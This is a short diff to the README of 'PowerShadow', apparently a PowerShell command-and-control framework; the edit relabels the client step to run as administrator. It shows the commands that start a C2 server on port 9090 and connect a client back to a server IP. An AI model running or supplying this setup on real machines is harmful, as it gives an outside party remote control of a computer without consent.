@@ -44,7 +44,7 @@ PowerShadow is an advanced, encrypted TCP Command & Control (C2) framework writt
 ```powershell
 sudo pwsh ./powershadow.ps1 -Mode Server -Port 9090
 ```
-- **Client:**
+- **Client (As Administrator):**
 ```powershell
 .\powershadow.ps1 -Mode Client -ServerIP <server_ip> -Port 9090
 ```
